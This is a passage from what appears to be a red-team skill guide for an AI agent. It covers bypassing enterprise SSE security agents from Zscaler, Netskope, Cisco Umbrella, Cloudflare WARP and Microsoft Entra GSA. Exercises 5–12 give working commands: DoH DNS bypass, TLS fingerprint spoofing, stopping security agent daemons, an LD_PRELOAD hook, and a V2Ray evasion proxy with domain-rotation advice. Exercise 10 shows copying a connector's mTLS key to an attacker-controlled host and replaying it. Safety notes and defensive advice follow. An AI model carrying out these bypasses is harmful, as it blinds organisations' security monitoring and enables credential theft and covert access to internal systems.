### Exercise 5: DoH/DoT Bypass of SSE-Enforced DNS

```bash
# Configure a local DoH resolver that bypasses the agent-enforced DNS
# Install dnscrypt-proxy
brew install dnscrypt-proxy  # macOS
# Edit /opt/homebrew/etc/dnscrypt-proxy.toml:
#   server_names = ['cloudflare', 'google']
#   listen_addresses = ['127.0.0.1:5300']
#   dnscrypt_servers = false
#   doh_servers = true
#   require_dnssec = true

brew services start dnscrypt-proxy

# Configure the system to use the local DoH resolver
# (the SSE agent enforces its DNS via the NetworkExtension; on a BYOD device
# without enforced DNS, this works directly. On a managed device, you may need
# to bind the application's resolver explicitly — e.g., Firefox network.trr.uri)
sudo networksetup -setdnsservers Wi-Fi 127.0.0.1

# Verify DNS is no longer going through the SSE
dig +trace example.com
# If the trace shows hops through a non-corporate resolver, the SSE DNS bypass is in effect.
```

### Exercise 6: JA3/JA4 Spoofing against Netskope MACE (Authorized Lab)

```bash
# Netskope's MACE classifies flows by TLS fingerprint + HTTP headers.
# A flow that matches a "trusted" client (e.g., Chrome on Windows) is allowed;
# an "unknown" client (e.g., curl) may be classified as proxy / datacenter / malicious.

# 1. Capture the JA3 fingerprint of a known-trusted client
# Use a clean Chrome installation:
python3 -c "
import socket, ssl, hashlib
ctx = ssl.create_default_context()
with socket.create_connection(('www.example.com', 443)) as sock:
    with ctx.wrap_socket(sock, server_hostname='www.example.com') as ssock:
        pass
"
# Better: use the ja3 Python library to compute the actual JA3
pip install ja3
python3 -m ja3 --host www.example.com --port 443

# 2. Configure curl-impersonate to spoof Chrome's JA3
# Install curl-impersonate (https://github.com/lwthiker/curl-impersonate)
brew install curl-impersonate
# Use chrome-specific binary:
curl_chrome116 https://blocked-by-mace.example.com/ -o /dev/null -w '%{http_code}\n'
# If MACE was blocking based on the curl JA3, this bypasses.

# 3. For Python, use tls-client (https://github.com/bogdanfinn/tls-client)
pip install tls-client
python3 -c "
import tls_client
session = tls_client.Session(client_identifier='chrome_120')
r = session.get('https://blocked-by-mace.example.com/')
print(r.status_code)
"
```

### Exercise 7: Split-Tunnel Race Condition (Zscaler ZIA-FWD-ZPA Pattern)

```bash
# Zscaler ZIA-FWD-ZPA routes "ZPA app traffic" direct, "internet traffic" via ZIA.
# A process can win the classification race during agent startup.

# Pattern 1: Race at agent startup (authorized lab)
#   1. Stop the ZscalerClientConnector agent (require local admin)
#   2. Open a socket to the destination
#   3. Restart the agent
#   Result: the socket was classified before the agent's filter installed → bypassed

sudo launchctl unload /Library/LaunchDaemons/com.zscaler.agentdaemon.plist
# Open the socket immediately (e.g., a long-lived HTTPS connection)
nohup curl --keepalive-time 60 -o /dev/null https://blocked-via-zpa.example.com &
sleep 1
sudo launchctl load /Library/LaunchDaemons/com.zscaler.agentdaemon.plist

# Pattern 2: LD_PRELOAD/DYLD_INSERT_LIBRARIES hook on connect()
# This requires disabling SIP on macOS (authorized lab); on Linux it works directly.
# The hook binds the socket before the agent's classification runs.

# Demonstration on Linux (no SIP):
cat > /tmp/hook_connect.c << 'EOF'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    static int (*real_connect)(int, const struct sockaddr *, socklen_t) = NULL;
    if (!real_connect) real_connect = dlsym(RTLD_NEXT, "connect");
    // Force the connect to happen during agent startup race window
    return real_connect(sockfd, addr, addrlen);
}
EOF
gcc -shared -fPIC -o /tmp/hook_connect.so /tmp/hook_connect.c -ldl
LD_PRELOAD=/tmp/hook_connect.so curl https://blocked.example.com
```

### Exercise 8: V2Ray as Anonymizer Evasion (Authorized Lab)

```bash
# Deploy a V2Ray (Xray) server on a residential IP (authorized lab)
# Configure vmess + WebSocket + TLS to look like legitimate HTTPS

# Server config (residential IP VPS): /etc/xray/config.json
cat > /etc/xray/config.json << EOF
{
  "inbounds": [{
    "port": 443,
    "protocol": "vmess",
    "settings": {"clients": [{"id": "REPLACE_WITH_YOUR_UUID", "alterId": 0}]},
    "streamSettings": {
      "network": "ws",
      "security": "tls",
      "tlsSettings": {"certificates": [{"certificateFile": "/etc/xray/fullchain.pem", "keyFile": "/etc/xray/privkey.pem"}]},
      "wsSettings": {"path": "/REPLACE_WITH_YOUR_PATH"}
    }
  }],
  "outbounds": [{"protocol": "freedom"}]
}
EOF
systemctl restart xray

# Client config: local client on the SSE-protected endpoint
cat > /tmp/v2ray-client.json << EOF
{
  "inbounds": [{"port": 1080, "listen": "127.0.0.1", "protocol": "socks"}],
  "outbounds": [{
    "protocol": "vmess",
    "settings": {"vnext": [{
      "address": "REPLACE_WITH_YOUR_RESIDENTIAL_IP",
      "port": 443,
      "users": [{"id": "REPLACE_WITH_YOUR_UUID", "alterId": 0}]
    }]},
    "streamSettings": {
      "network": "ws",
      "security": "tls",
      "tlsSettings": {"serverName": "REPLACE_WITH_YOUR_DOMAIN"},
      "wsSettings": {"path": "/REPLACE_WITH_YOUR_PATH"}
    }
  }]
}
EOF
xray run -c /tmp/v2ray-client.json &

# Use the local socks proxy
curl --socks5 127.0.0.1:1080 https://ifconfig.me

# To the SSE SWG: the flow looks like legitimate HTTPS to REPLACE_WITH_YOUR_DOMAIN.
# The SWG may still flag if the domain is on a blocklist; rotate domains or use CDN fronting.
```

### Exercise 9: Cisco Umbrella Roaming Client Bypass via DoH

```bash
# Cisco Umbrella roaming client enforces DNS via a local resolver that talks to Umbrella.
# DoH bypasses this entirely.

# Approach 1: Browser-enforced DoH (Firefox)
# about:config:
#   network.trr.uri = https://doh.opendns.com/dns-query  (or https://dns.google/dns-query)
#   network.trr.mode = 3  (TRR-only mode)

# Approach 2: Kill the roaming client (requires local admin)
sudo launchctl unload /Library/LaunchDaemons/com.cisco.umbrella.roamingclient.plist
# Now DNS uses the system resolver (which may not be Umbrella); bypass effective until MDM redeploys

# Approach 3: DoH-over-HTTPS to an outside resolver via a non-standard port (if the
# roaming client only blocks the standard DoH endpoints)
# Use a self-hosted DoH server on a non-standard port
curl -H 'accept: application/dns-json' \
  'https://doh.example.com:8443/dns-query?name=blocked.example.com&type=A'

# Approach 4: SmartProxy block-page bypass — when Umbrella returns a block page,
# some configurations allow direct IP access (the block is enforced at DNS resolution
# level only). Resolve the IP elsewhere, then connect directly:
# 1. Resolve blocked.example.com via DoH: get IP 192.0.2.123
# 2. Connect via curl --resolve to skip DNS entirely:
curl --resolve blocked.example.com:443:192.0.2.123 https://blocked.example.com/
```

### Exercise 10: ZPA App Connector Compromise (Authorized Lab)

```bash
# ZPA App Connectors are deployed inside the corporate network.
# They authenticate to the Zscaler cloud with a provisioning key + mTLS cert.

# On a compromised internal host running an App Connector (authorized lab):
# 1. Locate the connector's mTLS cert + provisioning key
sudo find /opt/zscaler /etc/zscaler -type f 2>/dev/null
# Look for: provisioning.key, app_connector.crt, app_connector.key, service-edge.pem

# 2. Inspect the mTLS cert
sudo openssl x509 -in /opt/zscaler/app_connector.crt -noout -subject -issuer -dates

# 3. The cert is the credential — replay it from another host to authenticate to Zscaler cloud
# Copy the cert + key to attacker-controlled host:
#   scp compromised:/opt/zscaler/app_connector.crt ./stolen.crt
#   scp compromised:/opt/zscaler/app_connector.key ./stolen.key

# 4. Use the stolen cert to authenticate as the App Connector to the Zscaler cloud API
ZPA_CUSTOMER_ID='REPLACE_WITH_YOUR_CUSTOMER_ID'
curl -s --cert ./stolen.crt --key ./stolen.key \
  "https://config.private.zscaler.com/api/v1/appConnectors" \
  -H "X-Zscaler-Customer-Id: $ZPA_CUSTOMER_ID"
# Returns the connector's config — including which internal apps it publishes

# 5. From here, the attacker can route through the App Connector to internal apps
# (cross-references `cloud-identity-attack` Zscaler OAuth patterns)
```

### Exercise 11: Cloudflare WARP Client Bypass

```bash
# Cloudflare WARP on macOS / Windows / Linux
# 1. Stop the WARP agent
#    macOS:
sudo launchctl unload /Library/LaunchDaemons/com.cloudflare.warp.daemon.plist
#    Linux (systemd):
sudo systemctl stop warp-svc

# 2. Verify egress is no longer Cloudflare
curl -s https://ifconfig.me/json

# 3. Alternative: route specific apps around WARP via a local proxy
# WARP routes "all traffic" through Cloudflare; to bypass per-app:
#   - Use a SOCKS proxy that goes direct (LD_PRELOAD hook on macOS requires SIP disabled)
#   - Or use a V2Ray client locally that wraps the traffic in TLS to a non-Cloudflare egress

# 4. Cloudflare Gateway bypass via DoH
# Gateway categorizes by domain; DoH to an outside resolver bypasses the domain-based policy
# Configure Firefox network.trr.uri to https://dns.google/dns-query, mode 3
```

### Exercise 12: Microsoft Entra Global Secure Access Client Bypass

```bash
# Microsoft Entra Global Secure Access (GSA) client on Windows / macOS
# 1. Locate the GSA client process and config
#    Windows: %PROGRAMFILES%\Microsoft\Entra\Global Secure Access Client\
#    macOS: /Applications/Microsoft\ Entra\ Global\ Secure\ Access\ Client.app/

# 2. Stop the GSA client (requires local admin; on Windows, the Advanced Endpoint
#    Management service may auto-restart)
#    Windows:
Stop-Service -Name "GSAService" -Force
#    macOS:
sudo launchctl unload /Library/LaunchDaemons/com.microsoft.gsa.daemon.plist

# 3. Verify the traffic forwarding profile is no longer enforced
# On Windows, the GSA client installs a WFP filter; removing the filter requires admin
# Use `netsh wfp show state` to dump the filters and find GSA's
netsh wfp show state file=gsa_wfp.txt
# Look for filter weights with providerName matching GSA — note them for removal

# 4. The GSA client trusts the Entra ID PRT — steal the PRT (cross-ref `cloud-identity-attack`)
# to replay through GSA from another device. The GSA profile accepts the PRT as identity.
```

## Common Pitfalls

- **Assuming the agent blocks everything**: The agent's policy is per-flow and classification-based. Pinning-aware apps, ECH-aware clients, and DoH-resolved domains bypass significant portions of the policy. Test the actual deployment, not the marketing.
- **Treating the SSE root cert as a local-only trust anchor**: The root cert is the SSE's authority to decrypt. If the cert is stolen (or the system trust store is writable on BYOD), the attacker can MitM the SSE itself — decrypting what the SSE decrypts.
- **Forgetting the IdP is the SSE's identity layer**: Storm-0558 showed that a stolen Entra ID token grants access to every service that trusts Entra ID, including the SSE. Audit the IdP-side compromise path, not just the agent-side.
- **Underestimating App Connector blast radius**: One ZPA App Connector / Netskope Publisher / Cloudflare Tunnel connector often publishes dozens of internal apps. Compromise one connector → reach every app it publishes. The connector's mTLS cert is a long-lived credential.
- **Trusting posture on the agent side**: The agent computes posture from local state. Frida hooks, file edits, and registry rewrites all spoof posture. Verify posture independently (Intune attestation, device cert from hardware root).
- **Misunderstanding ECH coverage**: ECH encrypts the inner SNI but the outer SNI is still visible (and often matches a CDN). The SWG sees the CDN flow, not the destination. If the SWG categorizes by IP reputation, ECH alone is insufficient; combine with a non-blocklisted CDN.
- **Ignoring agent anti-tampering**: Modern agents ship with code-signing checks, PTrace protection, and anti-Frida. Bypass requires SIP-disabled macOS, kernel-module unloaded Windows, or eBPF bypass Linux — all of which require local admin. Don't assume Frida "just works" in 2026.
- **Split-tunnel race is timing-dependent**: A race that works on one machine may not on another (different agent version, different filter install timing). Document the race window; do not assume reliable bypass.
- **Confusing "blocked by SWG" with "blocked by agent"**: A flow may be blocked by the agent locally (WFP filter) or by the SWG in the cloud. The bypass technique differs: agent bypass is local, SWG bypass is protocol-layer. Identify which before choosing a bypass.
- **Token replay timing**: OAuth tokens / Zscaler Tickets have TTLs. A replayed token may be expired; check TTL before relying on the replay.

## Safety Notes

- **Production SSE tenants**: any active bypass against a production SSE hides all traffic from the defender — this is the goal of the bypass and also the risk. Conduct active bypass testing in a test SSE tenant (Zscaler Beta, Netskope Sandbox, a lab Prisma Access) or with explicit engagement authorization that covers detection-evasion.
- **Agent tampering**: disabling the agent, hooking the agent with Frida, or modifying the agent's config files are detectable by EDR (CrowdStrike, Defender for Endpoint) and by the agent itself (modern agents phone home their integrity). Plan detection-evasion strategy in advance and disclose in the engagement report.
- **TLS root cert extraction**: extracting the SSE root cert from a managed device and installing it elsewhere grants the ability to MitM the SSE. This is destructive to the SSE's trust model; document and have a tested rollback path (cert rotation by the SSE admin).
- **App Connector compromise**: a stolen App Connector cert grants persistent access to internal apps until the cert is revoked by the admin. Treat as a long-lived credential; rotate post-engagement.
- **Anonymizer deployment**: deploying a V2Ray/Trojan server on a residential IP the defender does not own may violate the ISP's terms of service; use your own infrastructure or an authorized cloud provider.
- **DoH/DoT egress**: defenders in regulated environments may consider DoH/DoT to outside resolvers a policy violation. Confirm the engagement scope covers DNS bypass before testing.
- **Frida on production**: Frida-injection into a managed agent typically triggers EDR alerts. Use only in isolated lab or with explicit detection-evasion scoping.
- **Audit log footprint**: SSE admin APIs log every call; agent actions may be logged in cloud logging (Zscaler Nanolog, Netskope CCL, Cloudflare Gateway logs, Microsoft Entra Network Access logs). Assume actions are visible; plan accordingly.

## Hacker Laws

- **Trust but Verify** — The agent reports posture as "compliant" but the agent's posture state is local. Verify the SSE's independent attestation (device cert from MDM, Intune compliance attestation) before trusting the posture claim.
- **Defense in Depth** — SSE alone does not stop bypass. Layer SSE + IdP MFA + Intune/Jamf device attestation + EDR agent-integrity monitoring + DoH/DoT egress block + anonymizer infrastructure block + DLP on the decrypted plane. No single layer suffices.
- **Assume Breach** — Design monitoring assuming the agent is bypassed: alert on agent service stop, root cert tampering, unexpected DoH egress, unknown TUN interfaces, anomalous JA3/JA4 to "trusted" destinations. Assume the attacker reaches the data; design to detect *when*, not *if*.
- **Least Privilege** — A user should not have SSE admin (Zscaler ZIA Admin, Netskope Admin, Prisma Access Admin). An App Connector should publish only the apps it must. A BYOD device should not reach privileged internal apps via ZTNA.
- **Supply Chain Trust** — The SSE vendor is a supply chain: the agent trusts the vendor cloud, the cloud trusts the IdP, the IdP trusts the user's MFA. A compromise at any link (rogue agent update, vendor cloud compromise, IdP token theft, MFA bypass) propagates down the chain. Audit each link.
- **Minimize Attack Surface** — Disable split-tunnel where not needed, block DoH/DoT to outside resolvers, block ECH where unsupported, restrict App Connector deployment, lock the agent's IPC surface, harden the root cert ACLs. Every disabled feature is one fewer bypass.
- **Information Wants to Be Free** — The SSE root cert in the system trust store, the OAuth ticket in `~/Library/Application Support/Zscaler/`, the mTLS cert in `/opt/zscaler/app_connector.crt`, the IdP token in the browser cookie store — these are credentials in plain sight on the endpoint. Anyone with local admin reads every credential.
- **Weakest Link Is Human** — Most SSE bypass starts with a phished user (device code, consent grant, MFA fatigue, the Storm-0558 stolen token replayed through GSA), not a protocol-level flaw. Train users on consent prompts and device codes; rate-limit MFA prompts server-side; deploy phishing-resistant MFA.

## Cross-References

- **`skills/vpn-attack/SKILL.md`** — Traditional IPsec/SSL VPN (IKE, AnyConnect, Pulse, Fortinet, WireGuard). The predecessor skill; this skill covers the modern converged SASE/SSE stack that replaced VPN.
- **`skills/cloud-identity-attack/SKILL.md`** — The IdP layer (Entra ID, Okta, Auth0, Ping). The identity layer the SSE trusts; a stolen IdP token is the SSE credential. Storm-0558 is the canonical incident.
- **`skills/network-tunneling-proxy/SKILL.md`** — Generic tunneling (SSH, Chisel, Ngrok, DNS tunneling). The technique underlying anonymizer proxies (Shadowsocks/V2Ray/Obfs4/Trojan) used for SWG evasion.
- **`skills/network-sniffing-mitm/SKILL.md`** — TLS interception and MitM. The SSE cloud performs MitM by design; this skill's TLS bypass techniques are the inverse.
- **`skills/api-security/SKILL.md`** — Generic API testing. The vendor admin APIs (Zscaler, Netskope, Cloudflare, Microsoft Graph) are REST APIs with bearer tokens.
- **`skills/post-exploitation/SKILL.md`** — General post-exploitation on hosts. This skill's agent-bypass is post-exploitation of a specific process (the SSE agent).
- **`skills/anti-forensics/SKILL.md`** — Cleaning up agent logs, root cert installation, agent config changes post-engagement.
- **`skills/pentest-reporting/SKILL.md`** — Structuring the engagement deliverable with the SSE attack chain as the narrative spine.
- **`skills/digital-forensics/SKILL.md`** — Defender-side analysis of agent logs, root cert installation events, and anomalous DNS egress when responding to a real SSE bypass incident.
- **`skills/privilege-escalation/SKILL.md`** — Local privilege escalation to gain the admin rights required for some bypass techniques (agent stop, root cert install, registry edit).
- **`skills/av-edr-evasion/SKILL.md`** — Evasion of the EDR that monitors the SSE agent's integrity.

## Learning Resources

- **This skill's supplementary files**: `payloads.md`, `test-cases.md`
- **Deep-dive guide**: `guides/sase-sse-attack-playbook.md` — end-to-end red team workflow with per-vendor decision tree (Zscaler / Netskope / Palo Alto / Cisco / CATO / Cloudflare / Microsoft GSA), client connector reverse engineering deep dive, anonymizer evasion patterns, detection-evasion guidance, and report structure.
- **Reference repositories** (the inspirations for this skill):
  - curl-impersonate (4.2k stars): [github.com/lwthiker/curl-impersonate](https://github.com/lwthiker/curl-impersonate) — JA3/JA4 spoofing
  - tls-client (1.2k stars): [github.com/bogdanfinn/tls-client](https://github.com/bogdanfinn/tls-client) — Python TLS fingerprint spoofing
  - shadowsocks-rust (10.5k stars): [github.com/shadowsocks/shadowsocks-rust](https://github.com/shadowsocks/shadowsocks-rust) — anonymizer proxy
  - Xray-core (28k stars): [github.com/XTLS/Xray-core](https://github.com/XTLS/Xray-core) — V2Ray fork with vless/reality
  - trojan (20k stars): [github.com/trojan-gfw/trojan](https://github.com/trojan-gfw/trojan) — HTTPS-look proxy
  - obfs4 (in Tor): [gitweb.torproject.org](https://gitweb.torproject.org/pluggable-transports/obfs4.git) — TOR bridge obfuscation
  - mitmproxy (38k stars): [github.com/mitmproxy/mitmproxy](https://github.com/mitmproxy/mitmproxy) — HTTPS interception
  - Frida (17k stars): [github.com/frida/frida](https://github.com/frida/frida) — dynamic instrumentation
  - ja3 (2.4k stars): [github.com/salesforce/ja3](https://github.com/salesforce/ja3) — TLS fingerprinting
  - JA4+ (1.2k stars): [github.com/FoxIO-LLC/ja4](https://github.com/FoxIO-LLC/ja4) — JA4 fingerprint suite
  - Zscaler SDK Python: [github.com/cisagov/zscaler-sdk-python](https://github.com/cisagov/zscaler-sdk-python) — ZIA/ZPA admin API
- **External resources**:
  - Zscaler Threatlabz research: [threatlabz.com](https://threatlabz.com)
  - Netskope Threat Labs: [netskope.com/blog/category/threat-labs](https://www.netskope.com/blog/category/threat-labs)
  - CISA AA21-008A (SolarWinds Golden SAML, SSE implications): [cisa.gov/news-events/cybersecurity-advisories/aa21-008a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-008a)
  - CISA AA22-040A (LAPSUS$, MFA fatigue): [cisa.gov/news-events/cybersecurity-advisories/aa22-040a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-040a)
  - Mandiant Storm-0558 research: [cloud.google.com/blog/topics/threat-intelligence](https://cloud.google.com/blog/topics/threat-intelligence)
  - Microsoft Storm-0558 technical analysis: [microsoft.com/blog](https://microsoft.com/blog)
  - Mozilla ECH documentation: [wiki.mozilla.org/Security/Encrypted_ClientHello](https://wiki.mozilla.org/Security/Encrypted_ClientHello)
  - RFC 8446 (TLS 1.3): [rfc-editor.org/rfc/rfc8446](https://www.rfc-editor.org/rfc/rfc8446)
  - RFC 9460 (SVC/ECH): [rfc-editor.org/rfc/rfc9460](https://www.rfc-editor.org/rfc/rfc9460)
  - IETF DoH (RFC 8484): [rfc-editor.org/rfc/rfc8484](https://www.rfc-editor.org/rfc/rfc8484)
- **Core system files**: `SOUL.md`, `TOOLS.md`, `IDENTITY.md`
